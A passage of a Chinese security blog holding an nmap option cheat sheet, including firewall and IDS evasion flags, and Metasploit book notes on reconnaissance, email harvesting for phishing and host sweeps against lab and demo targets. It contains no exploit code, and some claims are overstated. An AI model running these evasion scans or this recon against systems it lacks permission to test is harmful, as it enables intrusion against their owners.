nmap -sR 192.168.43.80    //RPC scan远程程序调用扫描
</code></pre></li>
<li><h2 id="9-时间选项"><a href="#9-时间选项" class="headerlink" title="9.时间选项"></a>9.时间选项</h2><pre><code>nmap -T0 192.168.43.80   //-T0控制扫描的速度0：最慢；5：最快（同时开启几个端口进行扫描）

nmap -max-parallelism 4 (or -mix-parallelism) 192.168.43.80   //控制扫描速度，最大端口数为上面设置的4

nmap -min-hostgroup (or -max-hostgroup)  10 192.168.43.1/24   //最少同时扫描10个主机

nmap -initial-rtt-timeout 6000 192.168.43.80    //修改RTT超时值(毫秒，默认为10秒

nmap --max-retries 3 192.168.43.80    //尝试3次之后放弃

nmap --ttl 100 192.168.43.80     //TTL数据包的选择

nmap --host-timeout 1m 192.168.43.80   //在指定时间内回应主机

nmap --scan- delay 10s 192.168.43.80   //设置探针之间的时间延迟（有利于提高每个命令的准确性，但速度较慢）

nmap --max-scan-delay 20s 192.168.43.80    //设置最大扫描延迟

 nmap --min-rate 50 192.168.43.80    //设置nmap数据包每秒最低发送量:50(数量过高可能导致结果不准确)

 nmap --max-rate 10 192.168.43.80    //想做系统上的偷袭，避免一些探测系统的最大数据包速率的选择,降低扫描速率（每秒最多10个）

 nmap --defeat-rst-ratelimit 192.168.43.80    //请求复位数据包（如果解除复位率限制，一些目标可能袭击RST包）
</code></pre></li>
<li><h2 id="10-和防火墙的乐趣"><a href="#10-和防火墙的乐趣" class="headerlink" title="10.和防火墙的乐趣"></a>10.和防火墙的乐趣</h2><pre><code>nmap -f 192.168.43.80   //这个命令发送小于8个字节的探针，去扫描，任何防火墙和入侵检测系统都无法发现

nmap --mtu 8 192.168.43.80   //规定了最大传输单位（可以设置为任何8的倍数），也可以在这个命令中加上 send ETH 

nmap -D RND:10 192.168.43.80   //诱饵选项，是你的扫描使用许多伪装的IP，所以这个命令发送几个数据包到目的地，但是对于目标而言，却是统一时间被不同的机器扫描

nmap -sL 伪装地址(ip) 192.168.43.80   //使用伪装地址嗅探

nmap --source-port 54 192.168.43.80   //指定端口号（54）扫描

nmap --data-length 25 192.168.43.80   //加了一些探测数据包的随机数据，因为有时目标寻找特定大小的包去接受，几乎可以得到任何你想看到的字节大小，做一个特定的大小取决于特定的目标（你想进入的）

namp --randomize-hosts 192.168.43.80-160    //随机化你的目标，通过使用不同的脚本,遍历80到160，不泄露一些网络设备的MAC地址

nmap -sT -PN --spoof -mac 0 192.168.43.80  //0的结尾是告诉nmap生成随机行为，无论什么扫描，

nmap --badsum 192.168.43.80   //最后给检测者发送假的内容
</code></pre></li>
<li><h2 id="11-如何输出文件"><a href="#11-如何输出文件" class="headerlink" title="11.如何输出文件"></a>11.如何输出文件</h2><pre><code>nmap -oN scan.txt 192.168.43.1/24   //将扫描的结果保存在scan.txt中，也可以使用--append -output在txt文件中修改名称

nmap -oX scan.xml 192.168.43.1/24   //将扫描的结果保存在scan.xml中

nmap -oG scantron.txt 192.168.43.1/24   //将扫描的结果保存在scan.txt中，使用  grep &quot;microsoft&quot; scantron.txt   查看文件中的“”指定内容

nmap -oA scan2 192.168.43.1/24    //生成多个文件.xml .nmap(.txt) .gnmap(.grep)
</code></pre></li>
<li><h2 id="12-如何使用排错选项"><a href="#12-如何使用排错选项" class="headerlink" title="12.如何使用排错选项"></a>12.如何使用排错选项</h2><pre><code>nmap -h      //获取帮助

man nmap     //查看使用手册

nmap -v      //查看版本

nmap -d 192.168.43.80     //nmap调试(-d1:调试数量最小；-d9:调试数量最大，耗时长)

nmap --reason 192.168.43.80   //查看端口状态(conn-refused:拒绝;syn-acked:打开)

nmap --open 192.168.43.80   //扫描打开的端口，忽略关闭的

nmap --packet-trace 192.168.43.80   //展示扫描过程中发送或者接收的包

nmap --packet-trace test.txt 192.168.43.80     //展示扫描过程中发送或者接收的包，并保存在txt中（文件名添加在命令最后，是在IP之后还是上面写的那样???）

nmap -iflist     //展示那些配置在你电脑上的网络接口和路由信息

nmap -e wlan0(or eth0,eth1,wlan1) 192.168.43.80   //指定扫描的目标的特定网络接口类型
</code></pre></li>
<li><h2 id="13-nmap脚本引擎（Lua语言）"><a href="#13-nmap脚本引擎（Lua语言）" class="headerlink" title="13.nmap脚本引擎（Lua语言）"></a>13.nmap脚本引擎（Lua语言）</h2><ul>
<li><p>使用终端进入nmap的目录scripts，运行相关脚本，有400多个脚本，功能需要自己了解（百度）</p>
<pre><code>nmap --script banner 192.168.43.80   //通过连接开放的TCP端口，实现Banner劫持，然后输出所有信息

nmap --script &quot;http*&quot; 192.168.43.80     //执行你的脚本库中有“http”或者别的码字的脚本，进行扫描,输出脚本文件预置的信息

nmap --script default 192.168.43.80   //使用默认的脚本进行扫描

nmap --script ftp-anon --script-trace -p 21 192.168.43.80   //在使用脚本时遇到问题，使用ftp-anon脚本，在nmap连接21端口时，追踪nmap的运行

nmap --script-updatedb   //升级
</code></pre></li>
</ul>
</li>
<li><h2 id="14-Zenmap内部结构"><a href="#14-Zenmap内部结构" class="headerlink" title="14.Zenmap内部结构"></a>14.Zenmap内部结构</h2><ul>
<li>target:目标IP</li>
<li>profile:选择命令</li>
<li>scan:开始扫描</li>
<li>Hosts:列出所有扫描的目标</li>
<li>Services:运行的服务</li>
<li>自己玩吧</li>
</ul>
</li>
<li><h2 id="15-NDiff和技巧"><a href="#15-NDiff和技巧" class="headerlink" title="15.NDiff和技巧"></a>15.NDiff和技巧</h2><pre><code>ndiff test.xml test2.xml    //比较两个文件（-：第一个文件；+：第二个文件，你可以看到他们的不同与相同之处）

ndiff -v test1.xml test2.xml    //查看详细信息

ndiff --xml   //在屏幕上输出xml的输出信息，信息进入一个新的xml文件

nmap 192.168.43.0/24    //运行交互，在运行过程中按 v:显示详细过程信息，d：调试信息；p：查看追包
</code></pre></li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit魔鬼训练营笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/Metasploit魔鬼训练营笔记/" class="post-title-link" itemprop="url">Metasploit魔鬼训练营笔记</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:10:13 / 修改时间：06:11:00" itemprop="dateCreated datePublished" datetime="2019-01-14T06:10:13+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Metasploit魔鬼训练营"><a href="#Metasploit魔鬼训练营" class="headerlink" title="Metasploit魔鬼训练营"></a>Metasploit魔鬼训练营</h1><blockquote>
<h2 id="外围信息收集"><a href="#外围信息收集" class="headerlink" title="外围信息收集"></a>外围信息收集</h2></blockquote>
<h3 id="whois域名查询"><a href="#whois域名查询" class="headerlink" title="whois域名查询"></a>whois域名查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; whois testfire.net</span><br><span class="line">[*] exec: whois testfire.net</span><br><span class="line"></span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html</span><br><span class="line">   Updated Date: 2017-07-19T05:16:54Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2018-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br><span class="line">   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">   Name Server: ASIA3.AKAM.NET</span><br><span class="line">   Name Server: EUR2.AKAM.NET</span><br><span class="line">   Name Server: EUR5.AKAM.NET</span><br><span class="line">   Name Server: NS1-206.AKAM.NET</span><br><span class="line">   Name Server: NS1-99.AKAM.NET</span><br><span class="line">   Name Server: USC2.AKAM.NET</span><br><span class="line">   Name Server: USC3.AKAM.NET</span><br><span class="line">   Name Server: USW2.AKAM.NET</span><br><span class="line">   DNSSEC: unsigned</span><br><span class="line">   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/</span><br><span class="line">&gt;&gt;&gt; Last update of whois database: 2017-10-25T00:31:59Z &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">For more information on Whois status codes, please visit https://icann.org/epp</span><br><span class="line"></span><br><span class="line">NOTICE: The expiration date displayed in this record is the date the</span><br><span class="line">registrar&apos;s sponsorship of the domain name registration in the registry is</span><br><span class="line">currently set to expire. This date does not necessarily reflect the expiration</span><br><span class="line">date of the domain name registrant&apos;s agreement with the sponsoring</span><br><span class="line">registrar.  Users may consult the sponsoring registrar&apos;s Whois database to</span><br><span class="line">view the registrar&apos;s reported date of expiration for this registration.</span><br><span class="line"></span><br><span class="line">TERMS OF USE: You are not authorized to access or query our Whois</span><br><span class="line">database through the use of electronic processes that are high-volume and</span><br><span class="line">automated except as reasonably necessary to register domain names or</span><br><span class="line">modify existing registrations; the Data in VeriSign Global Registry</span><br><span class="line">Services&apos; (&quot;VeriSign&quot;) Whois database is provided by VeriSign for</span><br><span class="line">information purposes only, and to assist persons in obtaining information</span><br><span class="line">about or related to a domain name registration record. VeriSign does not</span><br><span class="line">guarantee its accuracy. By submitting a Whois query, you agree to abide</span><br><span class="line">by the following terms of use: You agree that you may use this Data only</span><br><span class="line">for lawful purposes and that under no circumstances will you use this Data</span><br><span class="line">to: (1) allow, enable, or otherwise support the transmission of mass</span><br><span class="line">unsolicited, commercial advertising or solicitations via e-mail, telephone,</span><br><span class="line">or facsimile; or (2) enable high volume, automated, electronic processes</span><br><span class="line">that apply to VeriSign (or its computer systems). The compilation,</span><br><span class="line">repackaging, dissemination or other use of this Data is expressly</span><br><span class="line">prohibited without the prior written consent of VeriSign. You agree not to</span><br><span class="line">use electronic processes that are automated and high-volume to access or</span><br><span class="line">query the Whois database except as reasonably necessary to register</span><br><span class="line">domain names or modify existing registrations. VeriSign reserves the right</span><br><span class="line">to restrict your access to the Whois database in its sole discretion to ensure</span><br><span class="line">operational stability.  VeriSign may restrict or terminate your access to the</span><br><span class="line">Whois database for failure to abide by these terms of use. VeriSign</span><br><span class="line">reserves the right to modify these terms at any time.</span><br><span class="line"></span><br><span class="line">The Registry database contains ONLY .COM, .NET, .EDU domains and</span><br><span class="line">Registrars.</span><br></pre></td></tr></table></figure>
<h3 id="nslookup域名查询"><a href="#nslookup域名查询" class="headerlink" title="nslookup域名查询"></a>nslookup域名查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~# nslookup</span><br><span class="line">&gt; set type=A</span><br><span class="line">&gt; testfire.net</span><br><span class="line">Server:		10.10.10.2</span><br><span class="line">Address:	10.10.10.2#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:	testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br></pre></td></tr></table></figure>
<h3 id="dig域名查询"><a href="#dig域名查询" class="headerlink" title="dig域名查询"></a>dig域名查询</h3><pre><code>root@bt:~#  dig @ns.watson.ibm.com testfire.net
</code></pre><h3 id="IP2Location地理位置查询"><a href="#IP2Location地理位置查询" class="headerlink" title="IP2Location地理位置查询"></a>IP2Location地理位置查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[GeoIP服务](http://www.maxmind.com)</span><br><span class="line">可通过这个网站上的经纬度，使用google地图进行定位</span><br><span class="line"></span><br><span class="line">[QQc纯真数据库](http://www.cz88.net)</span><br></pre></td></tr></table></figure>
<h3 id="netcraft网站提供信息查询服务"><a href="#netcraft网站提供信息查询服务" class="headerlink" title="netcraft网站提供信息查询服务"></a>netcraft网站提供信息查询服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[netcraft](http://searchdns.netcraft.com)</span><br><span class="line">搜索“testfire.net”--&gt;点击“lookup!”</span><br><span class="line">获取更加详细的信息:(http://toolbar.netcraft.com/site_report?url=http://www.testfire.net)</span><br></pre></td></tr></table></figure>
<h3 id="IP2Domain反查域名"><a href="#IP2Domain反查域名" class="headerlink" title="IP2Domain反查域名"></a>IP2Domain反查域名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[旁注](http://www.ip-adress.com/reversr_ip)</span><br><span class="line">因为一台服务器上可能运行多台虚拟机，使用不同的域名，但是用相同的IP，可以通过旁注获取其他网站的控制权，进而 实现迂回渗透的目的</span><br><span class="line"></span><br><span class="line">[国内的反查询网址](http://www.7c.com)</span><br></pre></td></tr></table></figure>
<h3 id="搜索引擎信息查询"><a href="#搜索引擎信息查询" class="headerlink" title="搜索引擎信息查询"></a>搜索引擎信息查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Google黑客数据库](http://www.exploit-db.com/google-dorks)</span><br><span class="line">两款自动查询工具：</span><br><span class="line">SiteDigger:Dwnload at (http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx)</span><br><span class="line">Search Diggity:Download at (http://www.stachliu.com)</span><br></pre></td></tr></table></figure>
<h3 id="搜索网站目录结构"><a href="#搜索网站目录结构" class="headerlink" title="搜索网站目录结构"></a>搜索网站目录结构</h3><h4 id="直接在google中搜索"><a href="#直接在google中搜索" class="headerlink" title="直接在google中搜索"></a>直接在google中搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">parent directory site:testfire.net</span><br><span class="line"></span><br><span class="line">    留意的几种文件类型：</span><br><span class="line">        inc:网站配置信息，数据库用户名/口令</span><br><span class="line">        bak:文本编辑器编辑后留下的备份文件，方便理解程序的内容</span><br><span class="line">        txt/sql:一般包含SQL脚本，透漏数据库结构信息</span><br></pre></td></tr></table></figure>
<h4 id="使用metasploit中的模块"><a href="#使用metasploit中的模块" class="headerlink" title="使用metasploit中的模块"></a>使用metasploit中的模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search dir_scanner</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                Disclosure Date  Rank    Description</span><br><span class="line">   ----                                ---------------  ----    -----------</span><br><span class="line">   auxiliary/scanner/http/dir_scanner                   normal  HTTP Directory Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/http/dir_scanner</span><br><span class="line">msf  auxiliary(dir_scanner) &gt; set THREADS 50</span><br><span class="line">THREADS =&gt; 50</span><br><span class="line">msf  auxiliary(dir_scanner) &gt; set RHOST www.testfire.net</span><br><span class="line">RHOST =&gt; www.testfire.net</span><br><span class="line">msf  auxiliary(dir_scanner) &gt; exploit</span><br></pre></td></tr></table></figure>
<h3 id="检索特定类型的文件"><a href="#检索特定类型的文件" class="headerlink" title="检索特定类型的文件"></a>检索特定类型的文件</h3><h4 id="直接在google中搜索-1"><a href="#直接在google中搜索-1" class="headerlink" title="直接在google中搜索"></a>直接在google中搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:testfire.net filetype:xls</span><br></pre></td></tr></table></figure>
<h3 id="搜索网站中的Email地址"><a href="#搜索网站中的Email地址" class="headerlink" title="搜索网站中的Email地址"></a>搜索网站中的Email地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf  auxiliary(dir_scanner) &gt; use auxiliary/gather/search_email_collector</span><br><span class="line">msf  auxiliary(search_email_collector) &gt; set DOMAIN altoromutual.com</span><br><span class="line">DOMAIN =&gt; altoromutual.com</span><br><span class="line">msf  auxiliary(search_email_collector) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Harvesting emails .....</span><br><span class="line">[*] Searching Google for email addresses from altoromutual.com</span><br><span class="line">通过对邮件地址的查询，结合社工的方式，对被攻击者更有效的实施钓鱼</span><br></pre></td></tr></table></figure>
<h3 id="搜索存在SQL注入的页面"><a href="#搜索存在SQL注入的页面" class="headerlink" title="搜索存在SQL注入的页面"></a>搜索存在SQL注入的页面</h3><h4 id="直接在google搜索中搜索"><a href="#直接在google搜索中搜索" class="headerlink" title="直接在google搜索中搜索"></a>直接在google搜索中搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:testfire.net inurl:login</span><br><span class="line">此网站存在注入点，输入字符未过滤</span><br></pre></td></tr></table></figure>
<h3 id="IP地址路由侦查"><a href="#IP地址路由侦查" class="headerlink" title="IP地址路由侦查"></a>IP地址路由侦查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~# traceroute 202.112.50.74</span><br><span class="line">traceroute to 202.112.50.74 (202.112.50.74), 30 hops max, 60 byte packets</span><br><span class="line"> 1  bogon (10.10.10.2)  0.215 ms  0.128 ms  0.143 ms</span><br><span class="line"> 2  * * *</span><br><span class="line"> 3  * * *</span><br><span class="line"> 4  * * *</span><br><span class="line"> 5  * * *</span><br><span class="line"> 6  * * *</span><br><span class="line"> 7  * * *</span><br><span class="line"> 8  * * *</span><br><span class="line"> 9  * * *</span><br><span class="line">10  * * *</span><br><span class="line">11  * * *</span><br><span class="line">12  * * *</span><br><span class="line">13  * * *</span><br><span class="line">14  * * *</span><br><span class="line">15  * * *</span><br><span class="line">16  * * *</span><br><span class="line">17  * * *</span><br><span class="line">18  * * *</span><br><span class="line">19  * * *</span><br><span class="line">20  * * *</span><br><span class="line">21  * * *</span><br><span class="line">22  * * *</span><br><span class="line">23  * * *</span><br><span class="line">24  * * *</span><br><span class="line">25  * * *</span><br><span class="line">26  * * *</span><br><span class="line">27  * * *</span><br><span class="line">28  * * *</span><br><span class="line">29  * * *</span><br><span class="line">30  * * *</span><br></pre></td></tr></table></figure>
<h2 id="主机探测与端口扫描"><a href="#主机探测与端口扫描" class="headerlink" title="主机探测与端口扫描"></a>主机探测与端口扫描</h2><h3 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~# ping -c 5 www.dvssc.com</span><br><span class="line">PING www.dvssc.com (10.10.10.129) 56(84) bytes of data.</span><br><span class="line">64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=1 ttl=64 time=2.28 ms</span><br><span class="line">64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=2 ttl=64 time=0.549 ms</span><br><span class="line">64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=3 ttl=64 time=0.513 ms</span><br><span class="line">64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=4 ttl=64 time=0.633 ms</span><br><span class="line">64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=5 ttl=64 time=0.525 ms</span><br><span class="line"></span><br><span class="line">--- www.dvssc.com ping statistics ---</span><br><span class="line">5 packets transmitted, 5 received, 0% packet loss, time 4000ms</span><br><span class="line">rtt min/avg/max/mdev = 0.513/0.901/2.287/0.694 ms</span><br></pre></td></tr></table></figure>
<h3 id="Metasploit主机发现模块"><a href="#Metasploit主机发现模块" class="headerlink" title="Metasploit主机发现模块"></a>Metasploit主机发现模块</h3><h4 id="arp-sweep"><a href="#arp-sweep" class="headerlink" title="arp_sweep"></a>arp_sweep</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search arp_sweep</span><br><span class="line">[!] Module database cache not built yet, using slow search</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                   Disclosure Date  Rank    Description</span><br><span class="line">   ----                                   ---------------  ----    -----------</span><br><span class="line">   auxiliary/scanner/discovery/arp_sweep                   normal  ARP Sweep Local Network Discovery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">msf auxiliary(arp_sweep) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/discovery/arp_sweep):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   RHOSTS                      yes       The target address range or CIDR identifier</span><br><span class="line">   SHOST                       no        Source IP Address</span><br><span class="line">   SMAC                        no        Source MAC Address</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads</span><br><span class="line">   TIMEOUT    5                yes       The number of seconds to wait for new data</span><br><span class="line"></span><br><span class="line">msf auxiliary(arp_sweep) &gt; set RHOSTS 10.10.10.0/24</span><br><span class="line">RHOSTS =&gt; 10.10.10.0/24</span><br><span class="line">msf auxiliary(arp_sweep) &gt; set THREADS 50</span><br><span class="line">THREADS =&gt; 50</span><br><span class="line">msf auxiliary(arp_sweep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.1 appears to be up (VMware, Inc.).</span><br><span class="line">[*] 10.10.10.2 appears to be up (VMware, Inc.).</span><br><span class="line">[*] 10.10.10.128 appears to be up (VMware, Inc.).</span><br><span class="line">[*] 10.10.10.129 appears to be up (VMware, Inc.).</span><br><span class="line">[*] 10.10.10.130 appears to be up (VMware, Inc.).</span><br><span class="line">[*] 10.10.10.254 appears to be up (VMware, Inc.).</span><br><span class="line">[*] 10.10.10.254 appears to be up (VMware, Inc.).</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h4 id="udp-sweep"><a href="#udp-sweep" class="headerlink" title="udp_sweep"></a>udp_sweep</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(arp_sweep) &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">msf auxiliary(udp_sweep) &gt; set RHOSTS 10.10.10.0/24</span><br><span class="line">RHOSTS =&gt; 10.10.10.0/24</span><br><span class="line">msf auxiliary(udp_sweep) &gt; set THREADS 50</span><br><span class="line">THREADS =&gt; 50</span><br><span class="line">msf auxiliary(udp_sweep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Sending 13 probes to 10.10.10.0-&gt;10.10.10.255 (256 hosts)</span><br><span class="line">[*] Discovered NetBIOS on 10.10.10.129:137 (OWASPBWA:&lt;00&gt;:U :OWASPBWA:&lt;03&gt;:U :OWASPBWA:&lt;20&gt;:U :__MSBROWSE__:&lt;01&gt;:G :WORKGROUP:&lt;1d&gt;:U :WORKGROUP:&lt;1e&gt;:G :WORKGROUP:&lt;00&gt;:G :00:00:00:00:00:00)</span><br><span class="line">[*] Discovered NetBIOS on 10.10.10.254:137 (METASPLOITABLE:&lt;00&gt;:U :METASPLOITABLE:&lt;03&gt;:U :METASPLOITABLE:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :00:00:00:00:00:00)</span><br><span class="line">[*] Discovered NetBIOS on 10.10.10.1:137 (LIXU-PC:&lt;00&gt;:U :WORKGROUP:&lt;00&gt;:G :LIXU-PC:&lt;20&gt;:U :00:50:56:c0:00:08)</span><br><span class="line">[*] Discovered DNS on 10.10.10.2:53 